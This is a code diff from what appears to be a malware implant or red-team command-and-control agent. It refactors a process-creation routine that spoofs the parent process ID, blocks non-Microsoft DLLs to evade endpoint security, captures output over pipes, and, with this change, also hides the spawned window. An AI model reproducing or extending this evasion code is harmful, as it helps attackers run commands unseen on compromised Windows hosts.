@@ -127,15 +127,16 @@ auto DECLFN Process::Create(
     STARTUPINFOEXA      SiEx         = { 0 };
     SECURITY_ATTRIBUTES SecurityAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
 
-    if ( Kh->PsCtx.BlockDlls ) { UpdateCount++; }
-    if ( Kh->PsCtx.ParentID  ) { UpdateCount++; };
+    if ( Kh->Ps->Ctx.BlockDlls ) { UpdateCount++; }
+    if ( Kh->Ps->Ctx.ParentID  ) { UpdateCount++; };
 
-    SiEx.StartupInfo.cb      = sizeof( STARTUPINFOEXA );
-    SiEx.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;
+    SiEx.StartupInfo.cb          = sizeof( STARTUPINFOEXA );
+    SiEx.StartupInfo.dwFlags     = EXTENDED_STARTUPINFO_PRESENT;
+    SiEx.StartupInfo.wShowWindow = SW_HIDE;
 
     PsFlags |= CREATE_NO_WINDOW;
 
-    if ( Kh->PsCtx.Pipe ) {
+    if ( Kh->Ps->Ctx.Pipe ) {
         Success = Kh->Krnl32.CreatePipe( &PipeRead, &PipeWrite, &SecurityAttr, PIPE_BUFFER_LENGTH );
         if ( !Success ) { goto _KH_END; }
 
@@ -147,19 +148,19 @@ auto DECLFN Process::Create(
         SiEx.StartupInfo.dwFlags   |= STARTF_USESTDHANDLES;
     }
 
-    if ( UpdateCount         ) ProcAttr.Initialize( UpdateCount );
-    if ( Kh->PsCtx.ParentID  ) ProcAttr.UpdateParentSpf( Process::Open( PROCESS_ALL_ACCESS, TRUE, Kh->PsCtx.ParentID ) );
-    if ( Kh->PsCtx.BlockDlls ) ProcAttr.UpdateBlockDlls();
+    if ( UpdateCount           ) ProcAttr.Initialize( UpdateCount );
+    if ( Kh->Ps->Ctx.ParentID  ) ProcAttr.UpdateParentSpf( Process::Open( PROCESS_ALL_ACCESS, TRUE, Kh->Ps->Ctx.ParentID ) );
+    if ( Kh->Ps->Ctx.BlockDlls ) ProcAttr.UpdateBlockDlls();
 
-    if ( Kh->PsCtx.ParentID || Kh->PsCtx.BlockDlls ) SiEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)ProcAttr.GetAttrBuff();
+    if ( Kh->Ps->Ctx.ParentID || Kh->Ps->Ctx.BlockDlls ) SiEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)ProcAttr.GetAttrBuff();
 
     Success = Kh->Krnl32.CreateProcessA( 
         NULL, CommandLine, NULL, NULL, TRUE, PsFlags, 
-        NULL, Kh->PsCtx.CurrentDir, &SiEx.StartupInfo, PsInfo
+        NULL, Kh->Ps->Ctx.CurrentDir, &SiEx.StartupInfo, PsInfo
     );
     if ( !Success ) { goto _KH_END; }
 
-    if ( Kh->PsCtx.Pipe ) {
+    if ( Kh->Ps->Ctx.Pipe ) {
         
         Kh->Ntdll.NtClose( PipeWrite ); PipeWrite = NULL;
 
